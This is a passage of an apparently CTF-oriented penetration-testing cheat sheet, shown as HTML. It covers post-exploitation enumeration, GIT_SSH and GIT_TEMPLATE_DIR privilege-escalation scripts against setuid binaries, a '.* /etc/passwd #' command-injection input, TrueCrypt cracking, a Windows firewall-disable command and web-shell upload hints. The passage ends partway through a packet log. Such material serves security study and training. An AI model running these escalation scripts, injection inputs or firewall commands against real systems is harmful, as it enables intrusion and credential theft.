<h4>GPG<a class="headerlink" href="#gpg" title="Link to this heading"></a></h4>
<p>Where are the GPG Keys stored?</p>
<p>By default in ~/.gnupg/ and can be found using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gpg</span> <span class="o">-</span><span class="n">K</span>
</pre></div>
</div>
</section>
</section>
<section id="network-information">
<h3>Network Information<a class="headerlink" href="#network-information" title="Link to this heading"></a></h3>
<p>Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?</p>
<section id="ip">
<h4>ip<a class="headerlink" href="#ip" title="Link to this heading"></a></h4>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ip</span> <span class="n">addr</span>

 <span class="mi">1</span><span class="p">:</span> <span class="n">lo</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">LOOPBACK</span><span class="p">,</span><span class="n">UP</span><span class="p">,</span><span class="n">LOWER_UP</span><span class="o">&gt;</span> <span class="n">mtu</span> <span class="mi">65536</span> <span class="n">qdisc</span> <span class="n">noqueue</span> <span class="n">state</span> <span class="n">UNKNOWN</span> <span class="n">group</span> <span class="n">default</span> <span class="n">qlen</span> <span class="mi">1000</span>
  <span class="n">link</span><span class="o">/</span><span class="n">loopback</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="n">brd</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
  <span class="n">inet</span> <span class="mf">127.0.0.1</span><span class="o">/</span><span class="mi">8</span> <span class="n">scope</span> <span class="n">host</span> <span class="n">lo</span>
     <span class="n">valid_lft</span> <span class="n">forever</span> <span class="n">preferred_lft</span> <span class="n">forever</span>
 <span class="mi">17</span><span class="p">:</span> <span class="n">wwan0</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">BROADCAST</span><span class="p">,</span><span class="n">MULTICAST</span><span class="p">,</span><span class="n">UP</span><span class="p">,</span><span class="n">LOWER_UP</span><span class="o">&gt;</span> <span class="n">mtu</span> <span class="mi">1500</span> <span class="n">qdisc</span> <span class="n">pfifo_fast</span> <span class="n">state</span> <span class="n">UNKNOWN</span> <span class="n">group</span> <span class="n">default</span> <span class="n">qlen</span> <span class="mi">1000</span>
    <span class="n">link</span><span class="o">/</span><span class="n">ether</span> <span class="n">b2</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="n">fe</span><span class="p">:</span><span class="mi">2</span><span class="n">b</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="n">c6</span> <span class="n">brd</span> <span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span><span class="p">:</span><span class="n">ff</span>
   <span class="n">inet</span> <span class="mf">14.97.194.148</span><span class="o">/</span><span class="mi">30</span> <span class="n">brd</span> <span class="mf">14.97.194.151</span> <span class="n">scope</span> <span class="k">global</span> <span class="n">dynamic</span> <span class="n">noprefixroute</span> <span class="n">wwan0</span>
     <span class="n">valid_lft</span> <span class="mi">5222</span><span class="n">sec</span> <span class="n">preferred_lft</span> <span class="mi">5222</span><span class="n">sec</span>
</pre></div>
</div>
</section>
<section id="hostname">
<h4>hostname<a class="headerlink" href="#hostname" title="Link to this heading"></a></h4>
<p>We can also check the ipaddress of the host using hostname command</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hostname</span> <span class="o">-</span><span class="n">I</span>
<span class="mf">172.17.0.1</span> <span class="mf">14.97.194.148</span>
</pre></div>
</div>
</section>
<section id="ss">
<h4>ss<a class="headerlink" href="#ss" title="Link to this heading"></a></h4>
<p>ss - another utility to investigate sockets</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ss</span>

      <span class="o">-</span><span class="n">n</span><span class="p">,</span> <span class="o">--</span><span class="n">numeric</span>
             <span class="n">Do</span> <span class="ow">not</span> <span class="k">try</span> <span class="n">to</span> <span class="n">resolve</span> <span class="n">service</span> <span class="n">names</span><span class="o">.</span>
    <span class="o">-</span><span class="n">l</span><span class="p">,</span> <span class="o">--</span><span class="n">listening</span>
             <span class="n">Display</span> <span class="n">only</span> <span class="n">listening</span> <span class="n">sockets</span> <span class="p">(</span><span class="n">these</span> <span class="n">are</span> <span class="n">omitted</span> <span class="n">by</span> <span class="n">default</span><span class="p">)</span><span class="o">.</span>
      <span class="o">-</span><span class="n">t</span><span class="p">,</span> <span class="o">--</span><span class="n">tcp</span>
             <span class="n">Display</span> <span class="n">TCP</span> <span class="n">sockets</span><span class="o">.</span>

      <span class="o">-</span><span class="n">u</span><span class="p">,</span> <span class="o">--</span><span class="n">udp</span>
             <span class="n">Display</span> <span class="n">UDP</span> <span class="n">sockets</span><span class="o">.</span>
</pre></div>
</div>
</section>
</section>
<section id="user-home-directory">
<h3>User Home Directory<a class="headerlink" href="#user-home-directory" title="Link to this heading"></a></h3>
<p>If we find that home directory contains</p>
<section id="firefox-thunderbird-seabird">
<h4>Firefox/ Thunderbird/ Seabird<a class="headerlink" href="#firefox-thunderbird-seabird" title="Link to this heading"></a></h4>
<p>We can utilize <a class="reference external" href="https://github.com/unode/firefox_decrypt">Firefox Decrypt</a> is a tool to extract passwords from Mozilla (Firefox/ Thunderbird/ Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.</p>
</section>
</section>
<section id="sudoers-file">
<h3>Sudoers file<a class="headerlink" href="#sudoers-file" title="Link to this heading"></a></h3>
<p>If the sudoers file contains:</p>
<section id="secure-path">
<h4>secure_path<a class="headerlink" href="#secure-path" title="Link to this heading"></a></h4>
<p>Path used for every command run from sudo. If you don’t trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.</p>
</section>
<section id="env-reset">
<h4>env_reset<a class="headerlink" href="#env-reset" title="Link to this heading"></a></h4>
<p>If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller’s environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.</p>
</section>
<section id="mail-badpass">
<h4>mail_badpass<a class="headerlink" href="#mail-badpass" title="Link to this heading"></a></h4>
<p>Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.</p>
</section>
</section>
<section id="run-parts">
<h3>run-parts<a class="headerlink" href="#run-parts" title="Link to this heading"></a></h3>
<p>run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">daily</span>
</pre></div>
</div>
</section>
<section id="java-keystore-file">
<h3>Java keystore file<a class="headerlink" href="#java-keystore-file" title="Link to this heading"></a></h3>
<p>Refer <a class="reference external" href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">Java Keytool essentials working with java keystores</a> and <a class="reference external" href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">openssl essentials working with ssl certificates private keys and csrs</a></p>
</section>
<section id="cracking-md5-hashes">
<h3>Cracking MD5 Hashes<a class="headerlink" href="#cracking-md5-hashes" title="Link to this heading"></a></h3>
<p>Try <a class="reference external" href="https://crackstation.net/">Crackstation</a> or <a class="reference external" href="https://isc.sans.edu/tools/reversehash.html">ISC Reverse hash</a></p>
</section>
<section id="steghide">
<h3>Steghide<a class="headerlink" href="#steghide" title="Link to this heading"></a></h3>
<p>Looking for hidden text in the images? Utilize steghide</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">steghide</span> <span class="n">version</span> <span class="mf">0.5.1</span>

<span class="n">the</span> <span class="n">first</span> <span class="n">argument</span> <span class="n">must</span> <span class="n">be</span> <span class="n">one</span> <span class="n">of</span> <span class="n">the</span> <span class="n">following</span><span class="p">:</span>
<span class="n">embed</span><span class="p">,</span> <span class="o">--</span><span class="n">embed</span>          <span class="n">embed</span> <span class="n">data</span>
<span class="n">extract</span><span class="p">,</span> <span class="o">--</span><span class="n">extract</span>      <span class="n">extract</span> <span class="n">data</span>
<span class="n">info</span><span class="p">,</span> <span class="o">--</span><span class="n">info</span>            <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="n">a</span> <span class="n">cover</span><span class="o">-</span> <span class="ow">or</span> <span class="n">stego</span><span class="o">-</span><span class="n">file</span>
<span class="n">info</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>       <span class="n">display</span> <span class="n">information</span> <span class="n">about</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span>
<span class="n">encinfo</span><span class="p">,</span> <span class="o">--</span><span class="n">encinfo</span>      <span class="n">display</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">supported</span> <span class="n">encryption</span> <span class="n">algorithms</span>
<span class="n">version</span><span class="p">,</span> <span class="o">--</span><span class="n">version</span>      <span class="n">display</span> <span class="n">version</span> <span class="n">information</span>
<span class="n">license</span><span class="p">,</span> <span class="o">--</span><span class="n">license</span>      <span class="n">display</span> <span class="n">steghide</span><span class="s1">&#39;s license</span>
<span class="n">help</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">display</span> <span class="n">this</span> <span class="n">usage</span> <span class="n">information</span>
</pre></div>
</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Sometimes, there is no password, so just press enter.</p>
</div>
</section>
<section id="git-client-privilege-escalation">
<h3>Git client Privilege Escalation<a class="headerlink" href="#git-client-privilege-escalation" title="Link to this heading"></a></h3>
<p>Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer <a class="reference external" href="https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial">12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial</a></p>
<p>In one of write-up, <a class="reference external" href="http://devloop.users.sourceforge.net/">Nicolas Surribas</a> has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.</p>
<section id="git-ssh">
<h4>GIT_SSH<a class="headerlink" href="#git-ssh" title="Link to this heading"></a></h4>
<p>If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the <a class="reference external" href="mailto:username&#37;&#52;&#48;host">username<span>&#64;</span>host</a> (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">cmd</span>
<span class="n">echo</span> <span class="s1">&#39;cp /root/flag.txt /tmp&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">cmd</span>
<span class="n">echo</span> <span class="s1">&#39;chmod 777 /tmp/flag.txt&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">cmd</span>
<span class="n">GIT_SSH</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">cmd</span> <span class="o">./</span><span class="n">setuidbinary</span><span class="p">(</span><span class="n">utilizing</span> <span class="n">git</span> <span class="n">clone</span><span class="o">/</span> <span class="n">git</span> <span class="n">fetch</span><span class="p">)</span>

<span class="ow">or</span>

<span class="n">echo</span> <span class="s1">&#39;chown root:root /home/username/priv ; chmod 4755 /home/username/priv&#39;</span> <span class="o">&gt;</span> <span class="n">ssh</span>

<span class="n">where</span> <span class="n">priv</span> <span class="ow">is</span> <span class="n">binary</span> <span class="n">compiled</span> <span class="kn">from</span> <span class="nn">suid.c</span>
</pre></div>
</div>
<p>This basically changes the command from</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">trace</span><span class="p">:</span> <span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">:</span> <span class="n">git</span> <span class="s1">&#39;clone&#39;</span> <span class="s1">&#39;ssh://root@machine-dev:/root/secret-project&#39;</span> <span class="s1">&#39;/mnt/secret-project/&#39;</span>
</pre></div>
</div>
<p>to</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">trace</span><span class="p">:</span> <span class="n">run_command</span><span class="p">:</span> <span class="s1">&#39;/home/user/ssh&#39;</span> <span class="s1">&#39;root@machine-dev&#39;</span> <span class="s1">&#39;git-upload-pack &#39;</span>\<span class="s1">&#39;&#39;</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">secret</span><span class="o">-</span><span class="n">project</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;&#39;</span>
</pre></div>
</div>
</section>
<section id="git-template-dir">
<h4>GIT_TEMPLATE_DIR<a class="headerlink" href="#git-template-dir" title="Link to this heading"></a></h4>
<p>Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer <a class="reference external" href="https://git-scm.com/docs/git-init">Git-init</a></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cp</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">git</span><span class="o">-</span><span class="n">core</span><span class="o">/</span><span class="n">templates</span><span class="o">/</span> <span class="n">mytemplates</span>
<span class="n">cd</span> <span class="n">mytemplates</span><span class="o">/</span><span class="n">hooks</span>
<span class="n">echo</span> <span class="s1">&#39;#!/bin/bash&#39;</span> <span class="o">&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">echo</span> <span class="s1">&#39;cp /root/flag /tmp/flag2&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">echo</span> <span class="s1">&#39;chown username.username /tmp/flag2&#39;</span> <span class="o">&gt;&gt;</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="n">post</span><span class="o">-</span><span class="n">checkout</span>
<span class="n">cd</span> <span class="o">../..</span>
<span class="n">GIT_TEMPLATE_DIR</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">username</span><span class="o">/</span><span class="n">mytemplates</span><span class="o">/</span> <span class="o">./</span><span class="n">setuidbinary</span><span class="p">(</span> <span class="n">utilizing</span> <span class="n">git</span> <span class="n">clone</span><span class="o">/</span> <span class="n">git</span> <span class="n">fetch</span><span class="p">)</span>
</pre></div>
</div>
</section>
</section>
<section id="metasploit-shell-upgrade">
<h3>Metasploit shell upgrade<a class="headerlink" href="#metasploit-shell-upgrade" title="Link to this heading"></a></h3>
<p>In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sessions</span> <span class="o">-</span><span class="n">h</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">sessions</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>

<span class="n">Active</span> <span class="n">session</span> <span class="n">manipulation</span> <span class="ow">and</span> <span class="n">interaction</span><span class="o">.</span>

<span class="n">OPTIONS</span><span class="p">:</span>

<span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="n">Upgrade</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">a</span> <span class="n">meterpreter</span> <span class="n">session</span> <span class="n">on</span> <span class="n">many</span> <span class="n">platforms</span>
</pre></div>
</div>
</section>
<section id="truecrypt-files">
<h3>Truecrypt Files<a class="headerlink" href="#truecrypt-files" title="Link to this heading"></a></h3>
<p>If you have a truecrypt volume to open and crack it’s password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">truecrack</span> <span class="o">--</span><span class="n">truecrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span> <span class="n">File</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">k</span> <span class="n">SHA512</span> <span class="o">-</span><span class="n">w</span> <span class="o">&lt;</span><span class="n">Wordlist_File</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>and Veracrypt or cryptsetup to open the file.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cryptsetup</span> <span class="nb">open</span> <span class="o">--</span><span class="nb">type</span> <span class="n">tcrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">MountName</span><span class="o">&gt;</span>
</pre></div>
</div>
</section>
<section id="grep-in-input-box">
<h3>Grep in input box?<a class="headerlink" href="#grep-in-input-box" title="Link to this heading"></a></h3>
<ul>
<li><p>If the html code contains the below where $key is the input from the user, and we want to read a particular value</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="n">passthru</span><span class="p">(</span><span class="s2">&quot;grep -i $key dictionary.txt&quot;</span><span class="p">);</span>

<span class="n">Remember</span> <span class="n">grep</span> <span class="n">works</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">way</span> <span class="s2">&quot;grep bitvijays /etc/passwd&quot;</span> <span class="ow">is</span> <span class="n">find</span> <span class="n">bitvijays</span> <span class="ow">in</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">.</span> <span class="n">This</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="ow">in</span> <span class="n">reading</span> <span class="n">some</span> <span class="n">files</span> <span class="n">on</span> <span class="n">the</span> <span class="n">disk</span><span class="o">.</span>
</pre></div>
</div>
</li>
<li><p>If the above contains</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>if(preg_match(&#39;/[;|&amp;]/&#39;,$key)) {
     print &quot;Input contains an illegal character!&quot;;
     } else {
     passthru(&quot;grep -i $key dictionary.txt&quot;);
 }
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><p>Here we can use “.* /etc/passwd #”</p>
<p>This command searches for any character in the file and comments out the reference to dictionary.txt</p>
</div></blockquote>
</section>
<section id="id34">
<h3>Others<a class="headerlink" href="#id34" title="Link to this heading"></a></h3>
<ul class="simple">
<li><p>While downloading files from FTP, make sure that you have set the mode to binary, otherwise downloaded files could be corrupted.</p></li>
<li><p>It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.</p></li>
<li><p>If there’s a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.</p></li>
<li><p>If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/</p></li>
<li><p>Identification of OS:</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">os</span><span class="o">-</span><span class="n">release</span>

<span class="n">NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu&quot;</span> <span class="n">VERSION</span><span class="o">=</span><span class="s2">&quot;16.04 LTS (Xenial Xerus)&quot;</span> <span class="n">ID</span><span class="o">=</span><span class="n">ubuntu</span>
<span class="n">ID</span>\<span class="n">_LIKE</span><span class="o">=</span><span class="n">debian</span> <span class="n">PRETTY</span>\<span class="n">_NAME</span><span class="o">=</span><span class="s2">&quot;Ubuntu 16.04 LTS&quot;</span> <span class="n">VERSION</span>\<span class="n">_ID</span><span class="o">=</span><span class="s2">&quot;16.04&quot;</span>
<span class="n">HOME</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://www.ubuntu.com/&quot;</span>
<span class="n">SUPPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://help.ubuntu.com/&quot;</span>
<span class="n">BUG</span>\<span class="n">_REPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">&quot;http://bugs.launchpad.net/ubuntu/&quot;</span>
<span class="n">UBUNTU</span>\<span class="n">_CODENAME</span><span class="o">=</span><span class="n">xenial</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).</p></li>
</ul>
<blockquote>
<div><ul class="simple">
<li><p>To find IPv6 from SNMP</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">snmpwalk</span> <span class="o">-</span><span class="n">v2c</span> <span class="o">-</span><span class="n">c</span> <span class="n">public</span> <span class="n">prism</span> <span class="mf">1.3.6.1.2.1.4.34.1.3</span>
<span class="n">iso</span><span class="mf">.3.6.1.2.1.4.34.1.3.2.48.1.0.0.0.0.0.0.0.0.0.0.0.0.0.1</span> <span class="o">=</span> <span class="n">INTEGER</span><span class="p">:</span> <span class="mi">335544320</span>
<span class="n">iso</span><span class="mf">.3.6.1.2.1.4.34.1.3.2.48.2.0.0.0.0.0.0.0.0.0.0.0.0.0.1</span> <span class="o">=</span> <span class="n">INTEGER</span><span class="p">:</span> <span class="mi">335544321</span>
<span class="n">iso</span><span class="mf">.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1</span> <span class="o">=</span> <span class="n">INTEGER</span><span class="p">:</span> <span class="mi">335544323</span>
</pre></div>
</div>
<p>Now, convert the decimal value after “iso.3.6.1.2.1.4.34.1.3.2” to hex which would be your IPv6 address “3002:1234:5678:ABCD::1”</p>
</div></blockquote>
<div class="admonition-todo admonition" id="id35">
<p class="admonition-title">Todo</p>
<p>Mention examples for IPv6 connect</p>
</div>
</div></blockquote>
<ul>
<li><p>Disable windows firewall</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">netsh</span> <span class="n">firewall</span> <span class="nb">set</span> <span class="n">opmode</span> <span class="n">disable</span>
</pre></div>
</div>
</li>
<li><p>Port 139 Open</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span>smbclient -N -L 192.168.1.2 WARNING: The &quot;syslog&quot; option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
kathy           Disk      Fred, What are we doing here?
tmp             Disk      All temporary files should be stored here
IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Server               Comment
---------            -------
RED                  red server (Samba, Ubuntu)

Workgroup            Master
---------            -------
WORKGROUP            RED

-N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
-L host and a list should appear. The -I option may be useful if your NetBIOS names don&#39;t match your TCP/IP DNS host names or if you are trying to reach a host on another network.
</pre></div>
</div>
<p>If you want to access the share you might want to type</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="n">IP</span>\\<span class="n">share</span>\<span class="n">_name</span>
</pre></div>
</div>
<p>So, in the above example, it would be</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> \\\\<span class="mf">192.168.1.2</span>\\<span class="n">kathy</span>
</pre></div>
</div>
<p>If port 139 is open, also run enum4linux, may be it would help get the user list</p>
</div></blockquote>
<ul>
<li><p>Port 69 UDP:</p>
<p>TFTP</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">get</span> <span class="ow">or</span> <span class="n">put</span> <span class="n">file</span>
</pre></div>
</div>
</li>
<li><p>Want to see what firewall rules are applied in Linux? Get /etc/iptables/rules.v4 and /etc/iptables/rules.v6 file.</p></li>
<li><p>Ruby Best way to get quoted words / phrases out of the text</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">text</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="o">/</span><span class="s2">&quot;([^&quot;</span><span class="p">]</span>\<span class="o">*</span><span class="p">)</span><span class="s2">&quot;/)</span>
</pre></div>
</div>
</li>
<li><p>Convert all text in a file from UPPER to lowercase</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tr</span> <span class="s1">&#39;[:upper:]&#39;</span> <span class="s1">&#39;[:lower:]&#39;</span> <span class="o">&lt;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span> <span class="o">&gt;</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
</li>
<li><p>Remove lines longer than x or shorter than x</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">awk</span> <span class="s1">&#39;length($0)&gt;x&#39;</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">awk</span> <span class="s1">&#39;length($0)</span>
</pre></div>
</div>
</li>
<li><p>Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if “Policy of Truth” is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.</p></li>
<li><p>Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.</p></li>
<li><p>If a machine is running a IIS Server and we have found a way to upload a file. We can try asp web-shell or meterpreter of asp, aspx, aspx-exe executable formats from msfvenom.</p></li>
<li><p>If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it’s a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922176</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922688</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.923157</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
